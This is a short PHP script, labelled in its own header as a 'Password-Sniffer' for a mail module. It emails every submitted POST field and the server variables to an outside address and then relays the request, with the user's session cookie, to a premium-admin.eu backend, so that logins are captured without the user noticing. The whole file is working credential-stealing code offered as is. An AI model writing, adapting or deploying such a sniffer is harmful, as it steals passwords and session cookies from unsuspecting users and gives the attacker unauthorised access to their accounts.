<?php

/**
 * RP² Password-Sniffer for mail-module
 *
 * @Author Andreas Doebeling
 * @Link https://github.com/ADoebeling
 * @Link http://www.doebeling.me
 */

mail("dev@1601.com", "[RP-PWD-Sniffer] Aenderungen gespeichert", print_r($_POST, 1).print_r($_SERVER, 1));


/**
 * Redirect with POST data.
 *
 * @param string $url URL.
 * @param array $data
 * @param array $headers Optional. Extra headers to send.
 * @throws Exception
 * @internal param array $post_data POST data. Example: array('foo' => 'var', 'id' => 123)
 * @link http://stackoverflow.com/a/15161640
 */
function redirect_post($url, array $data, array $headers = null) {
    $params = array(
        'http' => array(
            'method' => 'POST',
            'content' => http_build_query($data)
        )
    );
    if (!is_null($headers)) {
        $params['http']['header'] = '';
        foreach ($headers as $k => $v) {
            $params['http']['header'] .= "$k: $v\n";
        }
    }
    //print_r($params);
    $ctx = stream_context_create($params);
    $fp = fopen($url, 'rb', false, $ctx);
    if ($fp) {
        echo stream_get_contents($fp);
        die();
    } else {
        // Error
        //throw new Exception("Error loading '$url', $php_errormsg");
    }
}

$url = 'https://1601com.premium-admin.eu'.$_SERVER['SCRIPT_URL'];
$data = $_POST;
$cookie['Cookie'] = 'bid='.$_COOKIE['bid'].';';

redirect_post($url, $data, $cookie);


